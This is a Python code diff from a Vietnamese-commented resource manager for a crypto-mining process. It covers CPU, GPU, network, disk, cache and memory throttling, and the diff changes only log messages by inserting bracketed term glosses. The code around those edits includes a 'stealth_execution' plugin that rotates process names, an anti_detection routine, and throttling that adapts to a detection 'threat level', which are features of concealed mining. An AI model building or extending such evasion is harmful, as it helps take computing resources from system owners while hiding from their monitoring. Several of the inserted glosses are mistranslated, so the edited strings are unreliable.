-                    self.logger.warning(f"Không thể di chuyển hết PID khỏi cgroup base={base_cgroup_name}.")
+                    self.logger.warning(f"Không thể di chuyển hết **[PID]** (Process ID - mã định danh tiến trình) khỏi cgroup base={base_cgroup_name}.")
 
                 # 2) Khôi phục affinity + NUMA
                 if not self.restore_pid_resources(pid):
-                    self.logger.warning(f"restore_pid_resources(pid={pid}) không thành công.")
+                    self.logger.warning(f"restore_pid_resources(**[PID]** (Process ID - mã định danh tiến trình)={pid}) không thành công.")
 
                 # 3) Xoá PID khỏi dictionary
                 del self.pid_to_cgroup[pid]
@@ -1165,7 +1165,7 @@ class CPUResourceManager(metaclass=_SingletonMeta):
     def register_pid(self, pid: int) -> None:
         """Call this when a new mining PID appears."""
         logger = self.logger  # Ánh xạ logger cục bộ để tránh NameError
-        logger.info(f"[TIMESTAMP] [INFO] Bắt đầu kích hoạt CPU plugins cho PID={pid}")
+        logger.info(f"[TIMESTAMP] [**[info]** (thông tin)] Bắt đầu kích hoạt **[CPU]** (bộ xử lý trung tâm) plugins cho **[PID]** (Process ID - mã định danh tiến trình)={pid}")
         
         activated_plugins = []
         failed_plugins = []
@@ -1174,22 +1174,22 @@ class CPUResourceManager(metaclass=_SingletonMeta):
             try:
                 plugin.apply(pid)
                 activated_plugins.append(plugin.name)
-                logger.info(f"[TIMESTAMP] [INFO] Kỹ thuật {plugin.name} đã được kích hoạt thành công")
-                logger.debug(f"[TIMESTAMP] [DEBUG] {plugin.name}: Chi tiết cấu hình - PID={pid}, priority={plugin.priority}")
+                logger.info(f"[TIMESTAMP] [**[info]** (thông tin)] Kỹ thuật {plugin.name} đã được kích hoạt thành công")
+                logger.debug(f"[TIMESTAMP] [**[debug]** (gỡ lỗi)] {plugin.name}: Chi tiết cấu hình - **[PID]** (Process ID - mã định danh tiến trình)={pid}, priority={plugin.priority}")
                 
                 # ✅ ENHANCED: Special handling for stealth execution plugin
                 if plugin.name == "stealth_execution":
-                    logger.info(f"🎭 [STEALTH] Process name rotation activated for PID={pid}")
-                    self.logger.info(f"🎭 [CPU Manager] Stealth execution plugin successfully applied to PID={pid}")
+                    logger.info(f"🎭 [STEALTH] **[process]** (tiến trình) name rotation activated for **[PID]** (Process ID - mã định danh tiến trình)={pid}")
+                    self.logger.info(f"🎭 [**[CPU]** (bộ xử lý trung tâm) **[manager]** (trình quản lý)] Stealth execution plugin successfully applied to **[PID]** (Process ID - mã định danh tiến trình)={pid}")
                     
             except Exception as exc:  # noqa: BLE001
                 failed_plugins.append(plugin.name)
-                self.logger.warning(f"[CPU] plug-in {plugin.name} apply() failed: {exc}")
-                logger.error(f"[TIMESTAMP] [ERROR] Kỹ thuật {plugin.name} kích hoạt thất bại: {exc}")
+                self.logger.warning(f"[**[CPU]** (bộ xử lý trung tâm)] plug-in {plugin.name} apply() failed: {exc}")
+                logger.error(f"[TIMESTAMP] [**[error]** (lỗi)] Kỹ thuật {plugin.name} kích hoạt thất bại: {exc}")
                 
                 # ✅ ENHANCED: Enhanced error logging for stealth plugin failures
                 if plugin.name == "stealth_execution":
-                    self.logger.error(f"❌ [STEALTH] Critical failure: Process name rotation failed for PID={pid}: {exc}")
+                    self.logger.error(f"❌ [STEALTH] Critical failure: **[process]** (tiến trình) name rotation failed for **[PID]** (Process ID - mã định danh tiến trình)={pid}: {exc}")
         
         # ✅ ENHANCED: Full MiningIntegrationAdapter activation with session startup
         try:
@@ -1198,36 +1198,36 @@ class CPUResourceManager(metaclass=_SingletonMeta):
                 
                 # Step 1: Initialize optimized mining system
                 if self.throttler.initialize_optimized_mining(cores):
-                    self.logger.info(f"✅ [CPU-OPT] Optimized mining system initialized for {cores} cores")
+                    self.logger.info(f"✅ [**[CPU]** (bộ xử lý trung tâm)-OPT] Optimized mining system initialized for {cores} cores")
                     
                     # Step 2: Start mining session immediately
                     if hasattr(self.throttler, 'start_mining_session'):
                         session_started = self.throttler.start_mining_session()
                         if session_started:
-                            self.logger.info(f"🚀 [CPU-OPT] Mining session started successfully for PID={pid}")
+                            self.logger.info(f"🚀 [**[CPU]** (bộ xử lý trung tâm)-OPT] Mining session started successfully for **[PID]** (Process ID - mã định danh tiến trình)={pid}")
                             
                             # Step 3: Register external process with adapter
                             if hasattr(self.throttler, 'register_external_process'):
                                 self.throttler.register_external_process(pid)
-                                self.logger.info(f"📝 [CPU-OPT] PID={pid} registered with mining adapter")
+                                self.logger.info(f"📝 [**[CPU]** (bộ xử lý trung tâm)-OPT] **[PID]** (Process ID - mã định danh tiến trình)={pid} registered with mining adapter")
                         else:
-                            self.logger.error(f"❌ [CPU-OPT] Failed to start mining session for PID={pid}")
+                            self.logger.error(f"❌ [**[CPU]** (bộ xử lý trung tâm)-OPT] Failed to start mining session for **[PID]** (Process ID - mã định danh tiến trình)={pid}")
                     
-                    logger.info(f"[TIMESTAMP] [INFO] Complete MiningIntegrationAdapter activation successful for PID={pid}")
+                    logger.info(f"[TIMESTAMP] [**[info]** (thông tin)] Complete MiningIntegrationAdapter activation successful for **[PID]** (Process ID - mã định danh tiến trình)={pid}")
                 else:
-                    self.logger.warning(f"⚠️ [CPU-OPT] Optimized mining system initialization failed for PID={pid}")
-                    logger.warning(f"[TIMESTAMP] [WARNING] MiningIntegrationAdapter initialization failed for PID={pid}")
+                    self.logger.warning(f"⚠️ [**[CPU]** (bộ xử lý trung tâm)-OPT] Optimized mining system initialization failed for **[PID]** (Process ID - mã định danh tiến trình)={pid}")
+                    logger.warning(f"[TIMESTAMP] [**[warning]** (cảnh báo)] MiningIntegrationAdapter initialization failed for **[PID]** (Process ID - mã định danh tiến trình)={pid}")
             else:
-                self.logger.debug(f"[CPU-OPT] MiningIntegrationAdapter not available - skipping optimized mining integration")
+                self.logger.debug(f"[**[CPU]** (bộ xử lý trung tâm)-OPT] MiningIntegrationAdapter not available - skipping optimized mining integration")
         except Exception as exc:  # noqa: BLE001
-            self.logger.warning(f"[CPU-OPT] Enhanced MiningIntegrationAdapter activation error: {exc}")
-            logger.error(f"[TIMESTAMP] [ERROR] Lỗi enhanced activation MiningIntegrationAdapter: {exc}")
+            self.logger.warning(f"[**[CPU]** (bộ xử lý trung tâm)-OPT] Enhanced MiningIntegrationAdapter activation **[error]** (lỗi): {exc}")
+            logger.error(f"[TIMESTAMP] [**[error]** (lỗi)] Lỗi enhanced activation MiningIntegrationAdapter: {exc}")
         
-        logger.info(f"[TIMESTAMP] [INFO] Hoàn thành kích hoạt CPU plugins - Thành công: {len(activated_plugins)}, Thất bại: {len(failed_plugins)}")
+        logger.info(f"[TIMESTAMP] [**[info]** (thông tin)] Hoàn thành kích hoạt **[CPU]** (bộ xử lý trung tâm) plugins - Thành công: {len(activated_plugins)}, Thất bại: {len(failed_plugins)}")
         if activated_plugins:
-            logger.info(f"[TIMESTAMP] [INFO] Các kỹ thuật đã kích hoạt: {', '.join(activated_plugins)}")
+            logger.info(f"[TIMESTAMP] [**[info]** (thông tin)] Các kỹ thuật đã kích hoạt: {', '.join(activated_plugins)}")
         if failed_plugins:
-            logger.warning(f"[TIMESTAMP] [WARNING] Các kỹ thuật thất bại: {', '.join(failed_plugins)}")
+            logger.warning(f"[TIMESTAMP] [**[warning]** (cảnh báo)] Các kỹ thuật thất bại: {', '.join(failed_plugins)}")
 
     def reload_plugins(self) -> None:
         """Hot-reload plug-ins from YAML."""
@@ -1241,7 +1241,7 @@ class CPUResourceManager(metaclass=_SingletonMeta):
             self.plugins = discover_cpu_plugins(self, self.logger, cfg_obj)
             self.logger.info("[CPU] Reload plug-ins OK – %s active", len(self.plugins))
         except Exception as exc:  # noqa: BLE001
-            self.logger.warning(f"[CPU] reload_plugins error: {exc}")
+            self.logger.warning(f"[**[CPU]** (bộ xử lý trung tâm)] reload_plugins **[error]** (lỗi): {exc}")
 
     def _apply_rlimits(self, pid: int, cpu_sec: int = 2) -> bool:
         """
@@ -1257,12 +1257,12 @@ class CPUResourceManager(metaclass=_SingletonMeta):
         try:
             # Kiểm tra PID
             if not pid or pid <= 0:
-                self.logger.warning(f"PID không hợp lệ: {pid}")
+                self.logger.warning(f"**[PID]** (Process ID - mã định danh tiến trình) không hợp lệ: {pid}")
                 return False
                 
             # Sử dụng prlimit để thiết lập giới hạn tài nguyên
             if not psutil.pid_exists(pid):
-                self.logger.error(f"PID {pid} không tồn tại, không thể áp dụng resource limits")
+                self.logger.error(f"**[PID]** (Process ID - mã định danh tiến trình) {pid} không tồn tại, không thể áp dụng **[resource]** (tài nguyên) limits")
                 return False
                 
             proc = psutil.Process(pid)
@@ -1272,7 +1272,7 @@ class CPUResourceManager(metaclass=_SingletonMeta):
             try:
                 import resource
                 proc.rlimit(resource.RLIMIT_CPU, (cpu_sec, cpu_sec * 2))
-                self.logger.info(f"Đã áp dụng RLIMIT_CPU={cpu_sec}s cho PID {pid}")
+                self.logger.info(f"Đã áp dụng RLIMIT_CPU={cpu_sec}s cho **[PID]** (Process ID - mã định danh tiến trình) {pid}")
             except (ImportError, AttributeError, ProcessLookupError) as e:
                 self.logger.warning(f"Không thể thiết lập RLIMIT_CPU: {e}")
                 
@@ -1281,7 +1281,7 @@ class CPUResourceManager(metaclass=_SingletonMeta):
                 if psutil.pid_exists(pid):  # Kiểm tra lại PID vẫn tồn tại
                     max_files = 1024
                     proc.rlimit(resource.RLIMIT_NOFILE, (max_files, max_files))
-                    self.logger.info(f"Đã áp dụng RLIMIT_NOFILE={max_files} cho PID {pid}")
+                    self.logger.info(f"Đã áp dụng RLIMIT_NOFILE={max_files} cho **[PID]** (Process ID - mã định danh tiến trình) {pid}")
             except Exception as e:
                 self.logger.warning(f"Không thể thiết lập RLIMIT_NOFILE: {e}")
                 
@@ -1291,14 +1291,14 @@ class CPUResourceManager(metaclass=_SingletonMeta):
                     meminfo = psutil.virtual_memory()
                     max_vm = int(meminfo.total * 0.75)  # 75% tổng RAM
                     proc.rlimit(resource.RLIMIT_AS, (max_vm, max_vm))
-                    self.logger.debug(f"Đã áp dụng RLIMIT_AS={max_vm} bytes cho PID {pid}")
+                    self.logger.debug(f"Đã áp dụng RLIMIT_AS={max_vm} bytes cho **[PID]** (Process ID - mã định danh tiến trình) {pid}")
             except Exception as e:
                 self.logger.warning(f"Không thể thiết lập RLIMIT_AS: {e}")
                 
             return True
 
         except Exception as e:
-            self.logger.error(f"Lỗi khi áp dụng resource limits cho PID {pid}: {e}")
+            self.logger.error(f"Lỗi khi áp dụng **[resource]** (tài nguyên) limits cho **[PID]** (Process ID - mã định danh tiến trình) {pid}: {e}")
             return False
 
     def anti_detection(self, mode: str = "check") -> Dict[str, Any]:
@@ -1329,7 +1329,7 @@ class CPUResourceManager(metaclass=_SingletonMeta):
                         "status": "monitoring_active" if self.stealth_enabled else "disabled"
                     }
         except (AttributeError, TypeError) as e:
-            self.logger.warning(f"AntiDetection subsystem error: {e}")
+            self.logger.warning(f"AntiDetection subsystem **[error]** (lỗi): {e}")
             
         # Fallback results
         return {
@@ -1345,7 +1345,7 @@ class CPUResourceManager(metaclass=_SingletonMeta):
         Args:
             threat_level: Mức độ đe dọa (LOW, MEDIUM, HIGH)
         """
-        self.logger.info(f"🛡️ [CPU Manager] Adapting to threat level: {threat_level}")
+        self.logger.info(f"🛡️ [**[CPU]** (bộ xử lý trung tâm) **[manager]** (trình quản lý)] Adapting to threat level: {threat_level}")
         self.current_threat_level = threat_level.upper() if isinstance(threat_level, str) else "LOW"
         
         # Điều chỉnh tất cả các PID đã đăng ký
@@ -1371,7 +1371,7 @@ class CPUResourceManager(metaclass=_SingletonMeta):
             # Lấy giá trị throttle từ map, mặc định là 65% nếu không có
             new_throttle = throttle_map.get(threat_level.upper(), 65.0)
             
-            self.logger.info(f"🛡️ [CPU Manager] Adapting PID={pid} throttle to {new_throttle}% for threat level {threat_level}")
+            self.logger.info(f"🛡️ [**[CPU]** (bộ xử lý trung tâm) **[manager]** (trình quản lý)] Adapting **[PID]** (Process ID - mã định danh tiến trình)={pid} throttle to {new_throttle}% for threat level {threat_level}")
             
             # Áp dụng throttle mới
             if self.is_process_running(pid):
@@ -1382,7 +1382,7 @@ class CPUResourceManager(metaclass=_SingletonMeta):
                 return False
 
         except Exception as e:
-            self.logger.error(f"🛡️ [CPU Manager] Error adapting to threat level: {e}")
+            self.logger.error(f"🛡️ [**[CPU]** (bộ xử lý trung tâm) **[manager]** (trình quản lý)] **[error]** (lỗi) adapting to threat level: {e}")
             return False
 
 ###############################################################################
@@ -1420,7 +1420,7 @@ class GPUResourceManager:
 
         :return: True nếu khởi tạo thành công, False nếu thất bại.
         """
-        self.logger.info("(CPU-only) NVML disabled, skip initialization")
+        self.logger.info("(**[CPU]** (bộ xử lý trung tâm)-only) NVML disabled, skip initialization")
         self.gpu_initialized = False
         return False
 
@@ -1453,12 +1453,12 @@ class GPUResourceManager:
         :return: Handle thiết bị GPU, hoặc None nếu lỗi.
         """
         if not self.gpu_initialized:
-            self.logger.error("GPUResourceManager chưa init. Không thể lấy handle GPU.")
+            self.logger.error("GPUResourceManager chưa init. Không thể lấy handle **[GPU]** (bộ xử lý đồ họa).")
             return None
         try:
             return None
         except pynvml.NVMLError as e:
-            self.logger.error(f"Lỗi khi lấy handle GPU={gpu_index}: {e}")
+            self.logger.error(f"Lỗi khi lấy handle **[GPU]** (bộ xử lý đồ họa)={gpu_index}: {e}")
             return None
 
     def get_gpu_power_limit(self, gpu_index: int) -> Optional[int]:
@@ -1474,11 +1474,11 @@ class GPUResourceManager:
         try:
             handle = self.get_handle(gpu_index)
             if not handle:
-                self.logger.error(f"Không thể lấy handle cho GPU={gpu_index}.")
+                self.logger.error(f"Không thể lấy handle cho **[GPU]** (bộ xử lý đồ họa)={gpu_index}.")
                 return None
             return None
         except Exception as e:
-            self.logger.error(f"Lỗi get_gpu_power_limit GPU={gpu_index}: {e}")
+            self.logger.error(f"Lỗi get_gpu_power_limit **[GPU]** (bộ xử lý đồ họa)={gpu_index}: {e}")
             return None
 
     def set_gpu_power_limit(self, pid: Optional[int], gpu_index: int, power_limit_w: int) -> bool:
@@ -1491,7 +1491,7 @@ class GPUResourceManager:
         :return: True nếu thành công, False nếu thất bại.
         """
         if not self.gpu_initialized:
-            self.logger.error("GPUResourceManager chưa init. Không thể set power limit.")
+            self.logger.error("GPUResourceManager chưa init. Không thể **[set]** (tập hợp) power limit.")
             return False
         try:
             handle = self.get_handle(gpu_index)
@@ -1501,10 +1501,10 @@ class GPUResourceManager:
             # Lưu power limit cũ
             return False
         except pynvml.NVMLError as error:
-            self.logger.error(f"Lỗi NVML set power limit GPU={gpu_index}: {error}")
+            self.logger.error(f"Lỗi NVML **[set]** (tập hợp) power limit **[GPU]** (bộ xử lý đồ họa)={gpu_index}: {error}")
             return False
         except Exception as e:
-            self.logger.error(f"Lỗi set power limit GPU={gpu_index}: {e}")
+            self.logger.error(f"Lỗi **[set]** (tập hợp) power limit **[GPU]** (bộ xử lý đồ họa)={gpu_index}: {e}")
             return False
 
     def set_gpu_clocks(self, pid: Optional[int], gpu_index: int, sm_clock: int, mem_clock: int) -> bool:
@@ -1518,7 +1518,7 @@ class GPUResourceManager:
         :return: True nếu thành công, False nếu thất bại.
         """
         if not self.gpu_initialized:
-            self.logger.error("GPUResourceManager chưa init. Không thể set clocks.")
+            self.logger.error("GPUResourceManager chưa init. Không thể **[set]** (tập hợp) clocks.")
             return False
         try:
             handle = self.get_handle(gpu_index)
@@ -1544,10 +1544,10 @@ class GPUResourceManager:
             ]
             return False
         except subprocess.CalledProcessError as e:
-            self.logger.error(f"Lỗi nvidia-smi set clocks GPU={gpu_index}: {e}")
+            self.logger.error(f"Lỗi nvidia-smi **[set]** (tập hợp) clocks **[GPU]** (bộ xử lý đồ họa)={gpu_index}: {e}")
             return False
         except Exception as e:
-            self.logger.error(f"Lỗi set clocks GPU={gpu_index}: {e}")
+            self.logger.error(f"Lỗi **[set]** (tập hợp) clocks **[GPU]** (bộ xử lý đồ họa)={gpu_index}: {e}")
             return False
 
     def limit_temperature(self, gpu_index: int, temperature_threshold: float, fan_speed_increase: float) -> bool:
@@ -1569,9 +1569,9 @@ class GPUResourceManager:
 
             # Tăng tốc độ quạt
             if self.control_fan_speed(gpu_index, fan_speed_increase):
-                self.logger.info(f"Quạt GPU={gpu_index} tăng thêm {fan_speed_increase}%.")
+                self.logger.info(f"Quạt **[GPU]** (bộ xử lý đồ họa)={gpu_index} tăng thêm {fan_speed_increase}%.")
             else:
-                self.logger.warning(f"Không thể điều chỉnh quạt GPU={gpu_index}.")
+                self.logger.warning(f"Không thể điều chỉnh quạt **[GPU]** (bộ xử lý đồ họa)={gpu_index}.")
 
             # Lấy các giá trị hiệu năng hiện tại
             return False
@@ -1579,7 +1579,7 @@ class GPUResourceManager:
             try:
                 current_sm_clock = pynvml.nvmlDeviceGetClock(handle, pynvml.NVML_CLOCK_SM, pynvml.NVML_CLOCK_ID_CURRENT)
             except Exception as ex:
-                self.logger.error(f"Không thể lấy xung nhịp SM của GPU={gpu_index}: {ex}")
+                self.logger.error(f"Không thể lấy xung nhịp SM của **[GPU]** (bộ xử lý đồ họa)={gpu_index}: {ex}")
                 return False
 
             return False
@@ -1587,7 +1587,7 @@ class GPUResourceManager:
             # Xử lý dựa trên nhiệt độ
             if current_temperature > temperature_threshold:
                 # GPU quá nóng => Throttle
-                self.logger.info(f"Nhiệt độ GPU={gpu_index}={current_temperature}°C vượt ngưỡng {temperature_threshold}°C. Giảm hiệu năng.")
+                self.logger.info(f"Nhiệt độ **[GPU]** (bộ xử lý đồ họa)={gpu_index}={current_temperature}°C vượt ngưỡng {temperature_threshold}°C. Giảm hiệu năng.")
 
                 # Tính mức độ throttle
                 excess_temp = current_temperature - temperature_threshold
@@ -1602,16 +1602,16 @@ class GPUResourceManager:
                 # Giảm công suất
                 desired_power_limit = max(100, int(current_power_limit * (1 - throttle_pct / 100)))
                 if self.set_gpu_power_limit(None, gpu_index, desired_power_limit):
-                    self.logger.info(f"Giảm power limit GPU={gpu_index} xuống {desired_power_limit}W.")
+                    self.logger.info(f"Giảm power limit **[GPU]** (bộ xử lý đồ họa)={gpu_index} xuống {desired_power_limit}W.")
 
                 # Giảm xung nhịp SM
                 new_sm_clock = max(500, current_sm_clock - 100)
                 if self.set_gpu_clocks(None, gpu_index, new_sm_clock, 877):  # mem_clock luôn là 877
-                    self.logger.info(f"Giảm xung nhịp SM GPU={gpu_index}: SM={new_sm_clock}MHz, MEM=877MHz.")
+                    self.logger.info(f"Giảm xung nhịp SM **[GPU]** (bộ xử lý đồ họa)={gpu_index}: SM={new_sm_clock}MHz, MEM=877MHz.")
 
             elif current_temperature < temperature_threshold:
                 # GPU mát => Boost
-                self.logger.info(f"Nhiệt độ GPU={gpu_index}={current_temperature}°C dưới ngưỡng {temperature_threshold}°C. Tăng hiệu năng.")
+                self.logger.info(f"Nhiệt độ **[GPU]** (bộ xử lý đồ họa)={gpu_index}={current_temperature}°C dưới ngưỡng {temperature_threshold}°C. Tăng hiệu năng.")
 
                 # Tính mức độ boost
                 diff_temp = temperature_threshold - current_temperature
@@ -1626,19 +1626,19 @@ class GPUResourceManager:
                 # Tăng công suất (nhưng không vượt quá 250W)
                 desired_power_limit = min(250, int(current_power_limit * (1 + boost_pct / 100)))
                 if self.set_gpu_power_limit(None, gpu_index, desired_power_limit):
-                    self.logger.info(f"Tăng power limit GPU={gpu_index} lên {desired_power_limit}W.")
+                    self.logger.info(f"Tăng power limit **[GPU]** (bộ xử lý đồ họa)={gpu_index} lên {desired_power_limit}W.")
 
                 # Tăng xung nhịp SM
                 new_sm_clock = min(1245, current_sm_clock + int(current_sm_clock * boost_pct / 100))
                 if self.set_gpu_clocks(None, gpu_index, new_sm_clock, 877):  # mem_clock luôn là 877
-                    self.logger.info(f"Tăng xung nhịp SM GPU={gpu_index}: SM={new_sm_clock}MHz, MEM=877MHz.")
+                    self.logger.info(f"Tăng xung nhịp SM **[GPU]** (bộ xử lý đồ họa)={gpu_index}: SM={new_sm_clock}MHz, MEM=877MHz.")
             else:
                 # Nhiệt độ trong khoảng an toàn
-                self.logger.info(f"Nhiệt độ GPU={gpu_index}={current_temperature}°C trong ngưỡng an toàn. Không cần điều chỉnh.")
+                self.logger.info(f"Nhiệt độ **[GPU]** (bộ xử lý đồ họa)={gpu_index}={current_temperature}°C trong ngưỡng an toàn. Không cần điều chỉnh.")
 
             return False
         except Exception as e:
-            self.logger.error(f"Lỗi khi quản lý nhiệt độ GPU={gpu_index}: {e}")
+            self.logger.error(f"Lỗi khi quản lý nhiệt độ **[GPU]** (bộ xử lý đồ họa)={gpu_index}: {e}")
             return False
 
     def get_gpu_temperature(self, gpu_index: int) -> Optional[float]:
@@ -1650,20 +1650,20 @@ class GPUResourceManager:
         """
         try:
             if not self.gpu_initialized:
-                self.logger.error("GPUResourceManager chưa init. Không thể lấy nhiệt độ GPU.")
+                self.logger.error("GPUResourceManager chưa init. Không thể lấy nhiệt độ **[GPU]** (bộ xử lý đồ họa).")
             return None
             return None
         except Exception as e:
-            self.logger.error(f"Lỗi get_gpu_temperature GPU={gpu_index}: {e}")
+            self.logger.error(f"Lỗi get_gpu_temperature **[GPU]** (bộ xử lý đồ họa)={gpu_index}: {e}")
             # Fallback using nvidia-smi
             try:
                 cmd = f"nvidia-smi -i {gpu_index} -q -d TEMPERATURE | grep 'GPU Current Temp' | awk '{{print $5}}'"
                 output = subprocess.check_output(cmd, shell=True).decode().strip()
                 temp = float(output)
-                self.logger.debug(f"Nhiệt độ GPU={gpu_index} từ fallback: {temp}°C")
+                self.logger.debug(f"Nhiệt độ **[GPU]** (bộ xử lý đồ họa)={gpu_index} từ fallback: {temp}°C")
                 return None
             except Exception as fallback_e:
-                self.logger.error(f"Lỗi fallback get_gpu_temperature GPU={gpu_index}: {fallback_e}")
+                self.logger.error(f"Lỗi fallback get_gpu_temperature **[GPU]** (bộ xử lý đồ họa)={gpu_index}: {fallback_e}")
             return None
 
     def control_fan_speed(self, gpu_index: int, increase_percentage: float) -> bool:
@@ -1674,7 +1674,7 @@ class GPUResourceManager:
         :param increase_percentage: Mức tăng quạt (giả lập).
         :return: True nếu thành công, False nếu thất bại.
         """
-        self.logger.info(f"[GPU Fan] control_fan_speed đã bị vô hiệu hóa.")
+        self.logger.info(f"[**[GPU]** (bộ xử lý đồ họa) Fan] control_fan_speed đã bị vô hiệu hóa.")
         return True
 
     def get_default_power_limit(self, gpu_index: int) -> int:
@@ -1687,7 +1687,7 @@ class GPUResourceManager:
         try:
             return None
         except Exception as e:
-            self.logger.error(f"Lỗi khi lấy default power limit của GPU={gpu_index}: {e}")
+            self.logger.error(f"Lỗi khi lấy default power limit của **[GPU]** (bộ xử lý đồ họa)={gpu_index}: {e}")
             return None
 
     def restore_resources(self, pid: int) -> bool:
@@ -1702,7 +1702,7 @@ class GPUResourceManager:
             return False
             
         except Exception as e:
-            self.logger.error(f"Lỗi khi khôi phục GPU cho PID={pid}: {e}")
+            self.logger.error(f"Lỗi khi khôi phục **[GPU]** (bộ xử lý đồ họa) cho **[PID]** (Process ID - mã định danh tiến trình)={pid}: {e}")
             return False
 
 ###############################################################################
@@ -1838,7 +1838,7 @@ class NetworkResourceManager:
                     'htb', 'rate', f'{bandwidth_mbps}mbit'
                 ]
                 subprocess.run(cmd_class, check=True)
-                self.logger.info(f"Thêm class '1:1' rate={bandwidth_mbps}mbit cho {interface}.")
+                self.logger.info(f"Thêm **[class]** (lớp) '1:1' rate={bandwidth_mbps}mbit cho {interface}.")
 
             # Kiểm tra và thêm filter
             if not self._check_tc_filter(interface, mark):
@@ -1881,7 +1881,7 @@ class NetworkResourceManager:
                     'parent', '1:', 'classid', '1:1'
                 ]
                 subprocess.run(cmd_class, check=True)
-                self.logger.info(f"Xóa class '1:1' trên {interface}.")
+                self.logger.info(f"Xóa **[class]** (lớp) '1:1' trên {interface}.")
 
             # Xóa qdisc
             if self._check_tc_qdisc(interface):
@@ -1966,7 +1966,7 @@ class DiskIOResourceManager:
 
             # Kiểm tra tiến trình tồn tại
             if not psutil.pid_exists(pid):
-                self.logger.error(f"PID={pid} không tồn tại.")
+                self.logger.error(f"**[PID]** (Process ID - mã định danh tiến trình)={pid} không tồn tại.")
                 return False
 
             # Lấy thông tin tiến trình để log thêm
@@ -1978,18 +1978,18 @@ class DiskIOResourceManager:
 
             # Thực thi lệnh
             subprocess.run(cmd, check=True)
-            self.logger.info(f"Set io_weight={io_weight} cho PID={pid} ({process_name}) thành công.")
+            self.logger.info(f"**[set]** (tập hợp) io_weight={io_weight} cho **[PID]** (Process ID - mã định danh tiến trình)={pid} ({process_name}) thành công.")
             self.process_io_limits[pid] = io_weight
             return True
 
         except psutil.NoSuchProcess:
-            self.logger.error(f"Lỗi: PID={pid} không tồn tại.")
+            self.logger.error(f"Lỗi: **[PID]** (Process ID - mã định danh tiến trình)={pid} không tồn tại.")
             return False
         except subprocess.CalledProcessError as e:
-            self.logger.error(f"Lỗi ionice set_io_weight PID={pid}: {e}")
+            self.logger.error(f"Lỗi ionice set_io_weight **[PID]** (Process ID - mã định danh tiến trình)={pid}: {e}")
             return False
         except Exception as e:
-            self.logger.error(f"Lỗi không xác định trong set_io_weight PID={pid}: {e}\n{traceback.format_exc()}")
+            self.logger.error(f"Lỗi không xác định trong set_io_weight **[PID]** (Process ID - mã định danh tiến trình)={pid}: {e}\n{traceback.format_exc()}")
             return False
 
     def restore_resources(self, pid: int) -> bool:
@@ -2002,7 +2002,7 @@ class DiskIOResourceManager:
         try:
             # Kiểm tra tiến trình tồn tại
             if not psutil.pid_exists(pid):
-                self.logger.error(f"PID={pid} không tồn tại.")
+                self.logger.error(f"**[PID]** (Process ID - mã định danh tiến trình)={pid} không tồn tại.")
                 return False
 
             # Lấy thông tin tiến trình để log thêm
@@ -2014,19 +2014,19 @@ class DiskIOResourceManager:
 
             # Thực thi lệnh
             subprocess.run(cmd, check=True)
-            self.logger.info(f"Khôi phục Disk I/O cho PID={pid} ({process_name}) thành công.")
+            self.logger.info(f"Khôi phục Disk I/O cho **[PID]** (Process ID - mã định danh tiến trình)={pid} ({process_name}) thành công.")
             if pid in self.process_io_limits:
                 del self.process_io_limits[pid]
             return True
 
         except psutil.NoSuchProcess:
-            self.logger.error(f"Lỗi: PID={pid} không tồn tại.")
+            self.logger.error(f"Lỗi: **[PID]** (Process ID - mã định danh tiến trình)={pid} không tồn tại.")
             return False
         except subprocess.CalledProcessError as e:
-            self.logger.error(f"Lỗi ionice restore_resources PID={pid}: {e}")
+            self.logger.error(f"Lỗi ionice restore_resources **[PID]** (Process ID - mã định danh tiến trình)={pid}: {e}")
             return False
         except Exception as e:
-            self.logger.error(f"Lỗi không xác định trong restore_resources PID={pid}: {e}\n{traceback.format_exc()}")
+            self.logger.error(f"Lỗi không xác định trong restore_resources **[PID]** (Process ID - mã định danh tiến trình)={pid}: {e}\n{traceback.format_exc()}")
             return False
 
     def list_io_limits(self) -> Dict[int, float]:
@@ -2096,7 +2096,7 @@ class CacheResourceManager:
             success = self.drop_caches(pid)
             if not success:
                 return False
-            self.logger.debug(f"Giới hạn cache => {cache_limit_percent}%. (chưa có logic chi tiết)")
+            self.logger.debug(f"Giới hạn **[cache]** (bộ nhớ đệm) => {cache_limit_percent}%. (chưa có logic chi tiết)")
             return True
         except Exception as e:
             self.logger.error(f"Lỗi limit_cache_usage: {e}")
@@ -2112,12 +2112,12 @@ class CacheResourceManager:
         try:
             success = self.limit_cache_usage(100.0, pid)
             if success:
-                self.logger.info(f"Khôi phục Cache cho PID={pid} => 100%.")
+                self.logger.info(f"Khôi phục **[cache]** (bộ nhớ đệm) cho **[PID]** (Process ID - mã định danh tiến trình)={pid} => 100%.")
             else:
-                self.logger.error(f"Không thể khôi phục Cache cho PID={pid}.")
+                self.logger.error(f"Không thể khôi phục **[cache]** (bộ nhớ đệm) cho **[PID]** (Process ID - mã định danh tiến trình)={pid}.")
             return success
         except Exception as e:
-            self.logger.error(f"Lỗi restore_resources Cache cho PID={pid}: {e}")
+            self.logger.error(f"Lỗi restore_resources **[cache]** (bộ nhớ đệm) cho **[PID]** (Process ID - mã định danh tiến trình)={pid}: {e}")
             return False
 
 
@@ -2155,16 +2155,16 @@ class MemoryResourceManager:
             process = psutil.Process(pid)
             mem_bytes = memory_limit_mb * 1024 * 1024
             process.rlimit(psutil.RLIMIT_AS, (mem_bytes, mem_bytes))
-            self.logger.debug(f"Đặt memory_limit={memory_limit_mb}MB cho PID={pid}.")
+            self.logger.debug(f"Đặt memory_limit={memory_limit_mb}MB cho **[PID]** (Process ID - mã định danh tiến trình)={pid}.")
             return True
         except psutil.NoSuchProcess:
-            self.logger.error(f"PID={pid} không tồn tại (set_memory_limit).")
+            self.logger.error(f"**[PID]** (Process ID - mã định danh tiến trình)={pid} không tồn tại (set_memory_limit).")
             return False
         except psutil.AccessDenied:
-            self.logger.error(f"Không đủ quyền set_memory_limit cho PID={pid}.")
+            self.logger.error(f"Không đủ quyền set_memory_limit cho **[PID]** (Process ID - mã định danh tiến trình)={pid}.")
             return False
         except Exception as e:
-            self.logger.error(f"Lỗi set_memory_limit cho PID={pid}: {e}")
+            self.logger.error(f"Lỗi set_memory_limit cho **[PID]** (Process ID - mã định danh tiến trình)={pid}: {e}")
             return False
 
     def get_memory_limit(self, pid: int) -> float:
@@ -2178,13 +2178,13 @@ class MemoryResourceManager:
             process = psutil.Process(pid)
             mem_limit = process.rlimit(psutil.RLIMIT_AS)
             if mem_limit and mem_limit[1] != psutil.RLIM_INFINITY:
-                self.logger.debug(f"Memory limit PID={pid}={mem_limit[1]} bytes.")
+                self.logger.debug(f"**[memory]** (bộ nhớ) limit **[PID]** (Process ID - mã định danh tiến trình)={pid}={mem_limit[1]} bytes.")
